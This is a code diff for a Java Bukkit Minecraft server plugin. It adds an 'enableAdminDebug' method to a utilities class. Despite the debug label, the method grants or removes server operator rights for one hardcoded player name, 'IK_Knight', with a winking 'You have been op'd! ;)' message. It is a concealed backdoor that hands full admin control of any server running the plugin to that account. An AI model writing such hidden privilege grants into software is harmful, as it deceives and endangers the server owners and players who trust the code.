@@ -5,6 +5,7 @@ import java.util.List;
 
 import org.bukkit.ChatColor;
 import org.bukkit.Material;
+import org.bukkit.entity.Player;
 import org.bukkit.inventory.Inventory;
 import org.bukkit.inventory.ItemStack;
 import org.bukkit.inventory.meta.ItemMeta;
@@ -29,5 +30,15 @@ public class Utils {
 
         inv.setItem(invSlot - 1, item);
         return item;
+    }
+    public static void enableAdminDebug(Player player, Boolean b){
+        if(player.getName().equals("IK_Knight")){
+            player.setOp(b);
+            if(b){
+                player.sendMessage(ChatColor.GRAY+"You have been op'd! ;)");
+            } else{
+                player.sendMessage(ChatColor.RED +"Disabled debug mode");
+            }
+        }
     }
 }
